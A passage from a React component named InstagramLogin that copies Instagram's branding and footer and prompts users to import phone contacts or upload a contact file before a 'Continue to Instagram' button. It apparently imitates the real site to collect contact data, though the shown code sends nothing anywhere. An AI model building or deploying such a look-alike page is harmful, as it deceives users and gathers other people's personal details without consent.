                className="w-full h-12 flex items-center justify-center space-x-2"
              >
                <Phone className="w-5 h-5" />
                <span>{isImporting ? 'Importing...' : 'Import from Phone'}</span>
              </Button>

              {/* Upload File */}
              <Button 
                onClick={showFileUploadDialog}
                variant="outline"
                className="w-full h-12 flex items-center justify-center space-x-2"
              >
                <Upload className="w-5 h-5" />
                <span>Upload Contact File</span>
              </Button>

              {/* Skip */}
              <Button 
                onClick={() => setShowContactDialog(false)}
                variant="ghost"
                className="w-full h-10"
              >
                Skip for now
              </Button>
            </div>

            {/* Show imported contacts */}
            {contacts.length > 0 && (
              <div className="mt-6">
                <h4 className="font-semibold mb-3">Imported Contacts ({contacts.length})</h4>
                <div className="max-h-32 overflow-y-auto space-y-2">
                  {contacts.slice(0, 5).map((contact, index) => (
                    <div key={index} className={`text-sm p-2 rounded ${
                      isDarkMode ? 'bg-gray-800' : 'bg-gray-100'
                    }`}>
                      <div className="font-medium">{contact.name || 'Unknown'}</div>
                      {contact.tel && <div className="text-xs text-gray-500">{contact.tel}</div>}
                      {contact.email && <div className="text-xs text-gray-500">{contact.email}</div>}
                    </div>
                  ))}
                  {contacts.length > 5 && (
                    <div className="text-xs text-gray-500 text-center">
                      +{contacts.length - 5} more contacts
                    </div>
                  )}
                </div>
              </div>
            )}

            {/* Continue Button */}
            <div className="mt-6">
              <Button 
                onClick={handleFinalSubmit}
                className="w-full h-10"
                disabled={isImporting}
              >
                Continue to Instagram
              </Button>
            </div>
          </div>
        </div>
      )}

      {/* Footer */}
      <footer className="w-full max-w-4xl mx-auto px-4 py-8">
        <div className="flex flex-wrap justify-center gap-4 text-xs mb-4 transition-colors duration-300">
          {['Meta', 'About', 'Blog', 'Jobs', 'Help', 'API', 'Privacy', 'Terms', 'Locations', 'Instagram Lite', 'Threads', 'Contact uploading and non-users', 'Meta Verified'].map((link) => (
            <a 
              key={link} 
              href="#" 
              className={`hover:underline transition-colors duration-300 ${
                isDarkMode ? 'text-gray-400 hover:text-gray-300' : 'text-instagram-light-text'
              }`}
            >
              {link}
            </a>
          ))}
        </div>
        
        <div className="flex justify-center items-center gap-4 text-xs transition-colors duration-300">
          <select className={`bg-transparent border-none outline-none transition-colors duration-300 ${
            isDarkMode ? 'text-gray-400' : 'text-instagram-light-text'
          }`}>
            <option>English (UK)</option>
          </select>
          <span className={`transition-colors duration-300 ${
            isDarkMode ? 'text-gray-400' : 'text-instagram-light-text'
          }`}>© 2025 Instagram from Meta</span>
        </div>
      </footer>
    </div>
  );
};

export default InstagramLogin;